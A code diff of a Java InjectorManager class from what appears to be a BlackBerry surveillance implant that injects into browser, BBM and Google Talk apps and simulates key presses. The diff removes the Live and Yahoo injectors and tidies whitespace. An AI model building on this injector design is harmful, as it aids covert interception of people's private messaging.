@@ -32,8 +32,6 @@ import blackberry.injection.injectors.AInjector;
 import blackberry.injection.injectors.BBMInjector;
 import blackberry.injection.injectors.BrowserInjector;
 import blackberry.injection.injectors.GoogleTalkInjector;
-import blackberry.injection.injectors.LiveInjector;
-import blackberry.injection.injectors.YahooInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.interfaces.iSingleton;
@@ -91,9 +89,9 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
     }
 
     private InjectorManager() {
+        // TODO: aggiungere new LiveInjector(), new YahooInjector()
         injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
-                new GoogleTalkInjector(), new LiveInjector(),
-                new YahooInjector() };
+                new GoogleTalkInjector() };
 
         for (int i = 0; i < injectors.length; i++) {
             injector = injectors[i];
@@ -279,7 +277,6 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         return false;
     }
 
- 
     private boolean checkForeground(String codname) {
         int foregroundPin = manager.getForegroundProcessId();
         ApplicationDescriptor[] apps = manager.getVisibleApplications();
@@ -346,7 +343,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
 
     }
-    
+
     /**
      * verifica se occorre procedere con l'unlock.
      */
@@ -356,8 +353,8 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                 + ApplicationManager.getApplicationManager().isSystemLocked());
         //#endif
 
-        Status status=Status.self();
-        
+        Status status = Status.self();
+
         if (status.backlightEnabled()) {
             return false;
         }
@@ -387,7 +384,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                         //#endif
                     } else {
                         return true;
-                        
+
                     }
                 }
 
